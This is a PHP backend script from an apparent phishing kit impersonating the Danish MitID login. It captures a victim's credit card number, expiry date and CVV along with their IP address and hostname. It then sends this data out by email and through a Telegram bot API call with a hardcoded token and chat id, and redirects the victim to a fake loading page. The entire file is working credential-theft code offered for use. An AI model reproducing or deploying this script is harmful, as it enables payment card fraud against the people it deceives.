<?php
session_start();

$cc=$_POST["cc"];
$date=$_POST["date"];
$cvv=$_POST["cvv"];
$rand=rand(1000000,999999999).rand(1000000,999999999);
$rand2=base64_encode($rand);

        $_SESSION['cc'] = $cc;
        $_SESSION['date'] = $date;
        $_SESSION['cvv'] = $cvv;
        



$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "~ Coded By k4iser.a  ~\n";
$message .= "|----------|User  MitID |----------|\n";
$message .= "user  : ".$_SESSION['user']."\n";
$message .= "|----------|CC  MitID |----------|\n";
$message .= "Credit Card  : ".$_SESSION['cc']."\n";
$message .= "Exp Date    : ".$_SESSION['date']."\n";
$message .= "CVV    : ".$_SESSION['cvv']."\n";
$message .= "|------------------+|IP|-------------------|\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Hostname  : ".$hostname."\n";

$subject = "~ <Rslt- MitID>- Coded By k4iser.a ~ | $ip";

mail($email, $subject, $message);

$token = "6994118018:AAHgrLIc7x7AL1vPSf3jMTitc3954IsygEI";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=979803173&text=" . urlencode($message)."" );
 header("location:load1.php?vc?__event=card&service_id=top_card=IL")
?>